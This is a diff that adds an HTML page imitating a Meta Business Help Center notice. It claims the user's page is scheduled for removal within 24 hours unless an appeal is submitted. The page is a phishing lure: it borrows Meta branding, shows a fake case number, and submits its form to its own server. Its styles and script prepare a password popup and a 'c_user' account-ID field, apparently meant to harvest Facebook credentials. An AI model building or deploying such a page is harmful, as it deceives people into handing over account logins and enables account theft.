@@ -1,0 +1,651 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Review | Meta Business Help Center</title>
+    <style>
+        :root {
+            --meta-blue: #1877F2;
+            --meta-dark-blue: #166FE5;
+            --meta-red: #D9463E;
+            --meta-dark-gray: #65676B;
+            --meta-light-gray: #F0F2F5;
+            --meta-white: #FFFFFF;
+            --meta-border: #DADDE1;
+            --meta-green: #42B72A;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #F5F7FA;
+            min-height: 100vh;
+            color: #1C1E21;
+            line-height: 1.5;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .top-nav {
+            width: 100%;
+            background-color: var(--meta-white);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+            z-index: 100;
+            border-bottom: 1px solid var(--meta-border);
+        }
+        
+        .nav-header {
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid var(--meta-border);
+        }
+        
+        .sidebar-logo {
+            height: 28px;
+            width: auto;
+        }
+        
+        .nav-items {
+            display: flex;
+            overflow-x: auto;
+            padding: 0 10px;
+        }
+        
+        .nav-item {
+            padding: 12px 15px;
+            color: var(--meta-dark-gray);
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            font-size: 14px;
+            white-space: nowrap;
+            transition: all 0.2s ease;
+        }
+        
+        .nav-item:hover {
+            background-color: var(--meta-light-gray);
+            color: var(--meta-blue);
+        }
+        
+        .nav-item.active {
+            font-weight: 600;
+            color: var(--meta-blue);
+            background-color: #E7F3FF;
+            border-bottom: 3px solid var(--meta-blue);
+        }
+        
+        .main-content {
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            flex: 1;
+        }
+        
+        .review-container {
+            background-color: var(--meta-white);
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            padding: 25px;
+            width: 100%;
+            max-width: 600px;
+            border-top: 4px solid var(--meta-blue);
+            margin: 20px 0;
+        }
+        
+        .review-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--meta-border);
+        }
+        
+        .review-title {
+            color: var(--meta-red);
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .case-id {
+            font-size: 12px;
+            color: var(--meta-dark-gray);
+            background-color: var(--meta-light-gray);
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+        
+        .review-message {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .appeal-btn {
+            background-color: var(--meta-blue);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            width: 100%;
+            margin-top: 15px;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .appeal-btn:hover {
+            background-color: var(--meta-dark-blue);
+        }
+        
+        .warning-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--meta-red);
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        
+        .warning-icon {
+            color: var(--meta-red);
+            font-size: 20px;
+        }
+        
+        .info-image {
+            width: 100%;
+            height: auto;
+            margin: 20px 0;
+            display: block;
+            border-radius: 4px;
+            max-height: 300px;
+            object-fit: contain;
+            border: 1px solid var(--meta-border);
+        }
+        
+        .timeline {
+            margin: 20px 0;
+            padding-left: 20px;
+            border-left: 2px solid var(--meta-blue);
+        }
+        
+        .timeline-item {
+            position: relative;
+            padding-bottom: 15px;
+        }
+        
+        .timeline-item:last-child {
+            padding-bottom: 0;
+        }
+        
+        .timeline-dot {
+            position: absolute;
+            left: -25px;
+            top: 0;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background-color: var(--meta-blue);
+            border: 3px solid var(--meta-white);
+        }
+        
+        .timeline-date {
+            font-size: 12px;
+            color: var(--meta-dark-gray);
+            margin-bottom: 5px;
+        }
+        
+        .timeline-content {
+            font-size: 13px;
+            color: #333;
+        }
+        
+        .policy-links {
+            margin-top: 20px;
+            font-size: 13px;
+        }
+        
+        .policy-links a {
+            color: var(--meta-blue);
+            text-decoration: none;
+        }
+        
+        .policy-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            padding-top: 15px;
+            border-top: 1px solid var(--meta-border);
+            font-size: 12px;
+            color: var(--meta-dark-gray);
+            text-align: center;
+        }
+
+        /* Enhanced Popup styles - Smaller size */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+                    }
+        
+        .popup-content {
+            background-color: #F5F7FA;
+            padding: 20px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 400px;
+            max-height: 80vh;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            border-top: 4px solid var(--meta-blue);
+            overflow-y: auto;
+            position: relative;
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+                    }
+        
+        .popup-content::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .popup-content::-webkit-scrollbar-track {
+            background: var(--meta-light-gray);
+            border-radius: 3px;
+        }
+        
+        .popup-content::-webkit-scrollbar-thumb {
+            background-color: var(--meta-blue);
+            border-radius: 3px;
+        }
+        
+        .popup-close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 20px;
+            color: var(--meta-dark-gray);
+            cursor: pointer;
+            transition: color 0.2s;
+            padding: 5px;
+        }
+        
+        .popup-close:hover {
+            color: var(--meta-red);
+        }
+        
+        .popup-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--meta-blue);
+        }
+        
+        .popup-message {
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: #333;
+            text-align: left;
+            line-height: 1.5;
+        }
+        
+        /* Video Container Styles */
+        .video-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%;
+            margin: 15px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #000;
+            display: none;
+        }
+        
+        .video-container video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        /* Video Thumbnail Styles */
+        .video-thumbnail {
+            position: relative;
+            width: 100%;
+            cursor: pointer;
+            margin: 15px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #000;
+        }
+        
+        .video-thumbnail img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 12px;
+            text-align: left;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 500;
+            color: var(--meta-dark-gray);
+            font-size: 13px;
+        }
+        
+        .form-input {
+            width: 94%;
+            padding: 8px 10px;
+            border: 1px solid var(--meta-border);
+            border-radius: 6px;
+            font-size: 13px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--meta-blue);
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }
+        
+        .popup-btn {
+            background-color: var(--meta-blue);
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            font-size: 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            width: 100%;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+        
+        .popup-btn:hover {
+            background-color: var(--meta-dark-blue);
+        }
+        
+        .privacy-note {
+            font-size: 11px;
+            color: var(--meta-dark-gray);
+            margin-top: 15px;
+            text-align: left;
+            padding: 8px;
+            background-color: var(--meta-light-gray);
+            border-radius: 4px;
+        }
+        
+        .error-message {
+            color: var(--meta-red);
+            font-size: 13px;
+            margin-top: 5px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        /* Password popup specific styles */
+        .facebook-logo {
+            width: 160px;
+            margin: 0 auto 15px;
+            display: block;
+        }
+        
+        .password-input-container {
+            position: relative;
+            margin-bottom: 12px;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: var(--meta-dark-gray);
+        }
+        
+        .forgot-password {
+            display: block;
+            text-align: center;
+            margin-top: 8px;
+            color: var(--meta-blue);
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        @media (min-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .top-nav {
+                flex-direction: row;
+                align-items: center;
+                justify-content: space-between;
+                padding: 0 20px;
+            }
+            
+            .nav-header {
+                border-bottom: none;
+                padding: 12px 0;
+            }
+            
+            .nav-items {
+                padding: 0;
+                flex-grow: 1;
+                justify-content: flex-start;
+                margin-left: 20px;
+            }
+            
+            .nav-item {
+                border-bottom: 3px solid transparent;
+                border-left: none;
+            }
+            
+            .nav-item.active {
+                border-bottom: 3px solid var(--meta-blue);
+                border-left: none;
+            }
+            
+            .main-content {
+                padding: 40px;
+            }
+            
+            .review-container {
+                max-width: 700px;
+            }
+            
+            .info-image {
+                max-height: 400px;
+            }
+        }
+
+        @media (max-width: 767px) {
+            .nav-items {
+                -webkit-overflow-scrolling: touch;
+                scrollbar-width: none;
+            }
+            
+            .nav-items::-webkit-scrollbar {
+                display: none;
+            }
+            
+            .popup-content {
+                padding: 15px;
+            }
+            
+            .popup-title {
+                font-size: 17px;
+            }
+            
+            .popup-message {
+                font-size: 13px;
+            }
+            
+            .facebook-logo {
+                width: 140px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <!-- Initial Popup Overlay -->
+        
+    <!-- Password Popup Overlay -->
+    
+    <div class="container">
+        <div class="top-nav">
+            <div class="nav-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/800px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" class="sidebar-logo">
+            </div>
+            <div class="nav-items">
+                <div class="nav-item active"><i class="fas fa-shield-alt"></i> Privacy Center</div>
+                <div class="nav-item"><i class="fas fa-home"></i> Home Page</div>
+                <div class="nav-item"><i class="fas fa-search"></i> Search</div>
+                <div class="nav-item"><i class="fas fa-file-alt"></i> Privacy Policy</div>
+                <div class="nav-item"><i class="fas fa-gavel"></i> Community Standards</div>
+                <div class="nav-item"><i class="fas fa-newspaper"></i> Articles</div>
+                <div class="nav-item"><i class="fas fa-cog"></i> Settings</div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <form method="post" action="">
+                <div class="review-container">
+                    <div class="review-header">
+                        <div class="review-title">
+                            <i class="fas fa-exclamation-triangle warning-icon"></i>
+                            Page Review Required
+                        </div>
+                        <div class="case-id">Case #MPR-2023-08-45621</div>
+                    </div>
+                    
+                    <div class="warning-header">
+                        <i class="fas fa-calendar-times warning-icon"></i>
+                        Page Removal Scheduled
+                    </div>
+                    
+                    <div class="review-message">
+                        Our automated systems have detected that your page may violate our <a href="#" style="color: var(--meta-blue); text-decoration: none;">Community Standards</a>. After review, we've found that your page contains content that doesn't follow our policies regarding:
+                       
+                        Your page will be unpublished in <strong>24 hours</strong> unless you submit an appeal. During this time, the page will remain visible only to admins.
+                    </div>
+                    
+                    <img src="https://i.ibb.co/3mHGFBfg/download.png" alt="Appeal Process Information" class="info-image">
+                    
+                    <button type="submit" class="appeal-btn">
+                        <i class="fas fa-paper-plane"></i> Submit Appeal
+                    </button>
+                    
+                    <div class="policy-links">
+                        Learn more about: 
+                        <a href="#">Page Content Policies</a> | 
+                        <a href="#">Appeal Process</a> | 
+                        <a href="#">Community Standards</a>
+                    </div>
+                    
+                    <div class="footer">
+                        Meta © 2025 · Help Center · Privacy Policy · Terms of Service
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Simple navigation item activation
+        const navItems = document.querySelectorAll('.nav-item');
+        navItems.forEach(item => {
+            item.addEventListener('click', () => {
+                navItems.forEach(i => i.classList.remove('active'));
+                item.classList.add('active');
+            });
+        });
+        
+        // Close popup functionality
+                
+        // Video thumbnail click handler
+        const videoThumbnail = document.getElementById('videoThumbnail');
+        const videoContainer = document.getElementById('videoContainer');
+        const instructionVideo = document.getElementById('instructionVideo');
+        
+        if (videoThumbnail) {
+            videoThumbnail.addEventListener('click', function() {
+                this.style.display = 'none';
+                videoContainer.style.display = 'block';
+                instructionVideo.play();
+            });
+        }
+        
+        // Add validation for c_user field
+        const cUserInput = document.getElementById('c_user');
+        const cUserError = document.getElementById('c_user_error');
+        
+        if (cUserInput) {
+            cUserInput.addEventListener('input', function() {
+                if (!/^\d*$/.test(this.value)) {
+                    cUserError.style.display = 'flex';
+                } else {
+                    cUserError.style.display = 'none';
+                }
+            });
+            
+            // Also validate on form submission
+            const appealForm = document.querySelector('.appeal-form');
+            if (appealForm) {
+                appealForm.addEventListener('submit', function(e) {
+                    if (!/^\d+$/.test(cUserInput.value)) {
+                        e.preventDefault();
+                        cUserError.style.display = 'flex';
+                        cUserInput.focus();
+                    }
+                });
+            }
+        }
+    </script>
+</body>
+</html>
